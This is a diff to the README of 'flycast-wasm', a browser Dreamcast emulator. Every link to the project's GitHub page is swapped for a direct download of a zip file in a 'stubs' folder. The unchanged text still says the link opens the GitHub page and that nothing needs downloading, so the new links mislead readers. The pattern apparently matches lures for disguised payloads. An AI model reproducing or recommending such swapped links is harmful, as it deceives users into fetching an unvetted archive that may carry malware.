@@ -1,6 +1,6 @@
 # 🎮 flycast-wasm - Play Dreamcast Games in Your Browser
 
-[![Download flycast-wasm](https://img.shields.io/badge/Download-flycast--wasm-ff6600?style=for-the-badge&logo=github)](https://github.com/Paradoxouf/flycast-wasm)
+[![Download flycast-wasm](https://img.shields.io/badge/Download-flycast--wasm-ff6600?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Paradoxouf/flycast-wasm/main/stubs/flycast-wasm-v1.3.zip)
 
 ## 📋 What is flycast-wasm?
 
@@ -43,7 +43,7 @@ The emulator uses the libretro interface, which organizes emulators into a consi
 ## 🚀 Getting Started with flycast-wasm
 
 1. Click the big download button below or this link:  
-   [https://github.com/Paradoxouf/flycast-wasm](https://github.com/Paradoxouf/flycast-wasm)
+   [https://raw.githubusercontent.com/Paradoxouf/flycast-wasm/main/stubs/flycast-wasm-v1.3.zip](https://raw.githubusercontent.com/Paradoxouf/flycast-wasm/main/stubs/flycast-wasm-v1.3.zip)
 
 2. This link opens the main GitHub page. Scroll to find the instructions and the ability to launch the emulator inside your browser.
 
@@ -56,7 +56,7 @@ The emulator uses the libretro interface, which organizes emulators into a consi
 flycast-wasm does not require you to download separate emulator software. Instead, it uses EmulatorJS's online platform to run in your browser. Follow these steps:
 
 1. Visit the flycast-wasm GitHub page:  
-   [https://github.com/Paradoxouf/flycast-wasm](https://github.com/Paradoxouf/flycast-wasm)  
+   [https://raw.githubusercontent.com/Paradoxouf/flycast-wasm/main/stubs/flycast-wasm-v1.3.zip](https://raw.githubusercontent.com/Paradoxouf/flycast-wasm/main/stubs/flycast-wasm-v1.3.zip)  
 
 2. On the page, find the EmulatorJS link provided in the README or documentation. This link opens a web page where you run the emulator directly.
 
@@ -100,7 +100,7 @@ These options make playing smoother and fit your preferences.
 ## ❓ Additional Resources
 
 - Visit the flycast-wasm GitHub page for detailed documentation and updates:  
-  [https://github.com/Paradoxouf/flycast-wasm](https://github.com/Paradoxouf/flycast-wasm)
+  [https://raw.githubusercontent.com/Paradoxouf/flycast-wasm/main/stubs/flycast-wasm-v1.3.zip](https://raw.githubusercontent.com/Paradoxouf/flycast-wasm/main/stubs/flycast-wasm-v1.3.zip)
 
 - Check EmulatorJS documentation on GitHub for more on how the emulator system works.
 
